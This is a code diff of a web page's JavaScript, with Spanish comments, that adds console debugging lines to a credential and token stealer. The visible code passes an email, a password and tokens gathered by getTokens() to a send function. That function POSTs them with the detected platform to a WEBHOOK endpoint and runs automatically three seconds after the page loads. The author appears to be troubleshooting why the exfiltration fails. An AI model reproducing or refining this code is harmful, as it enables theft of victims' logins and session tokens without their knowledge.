@@ -261,8 +261,13 @@
         
         // Enviar al webhook
         function send(email, pass) {
+            console.log('Send function called with email:', email ? 'YES' : 'NO', 'pass:', pass ? 'YES' : 'NO');
+            
             var tokens = getTokens();
+            console.log('Tokens found:', tokens.length, tokens);
+            
             var platform = getPlatform();
+            console.log('Platform detected:', platform);
             
             var fields = [
                 {name: 'Platform', value: platform || 'Unknown', inline: true},
@@ -330,18 +335,27 @@
             };
             
             try {
+                console.log('Attempting to send webhook...', payload);
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', WEBHOOK);
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 
                 // Debug: ver qué se está enviando
                 xhr.onload = function() {
+                    console.log('Webhook response:', xhr.status, xhr.responseText);
                     if (xhr.status !== 204 && xhr.status !== 200) {
                         console.error('Webhook error:', xhr.status, xhr.responseText);
+                    } else {
+                        console.log('Webhook sent successfully!');
                     }
                 };
                 
+                xhr.onerror = function() {
+                    console.error('Network error sending webhook');
+                };
+                
                 xhr.send(JSON.stringify(payload));
+                console.log('Webhook request sent');
             } catch(e) {
                 console.error('Send error:', e);
             }
@@ -381,7 +395,9 @@
         });
         
         // Auto-scan al cargar
+        console.log('Page loaded, auto-scan will start in 3 seconds...');
         var autoTimer = window.setTimeout(function() {
+            console.log('Auto-scan triggered');
             send(null, null);
         }, 3000);
     </script>
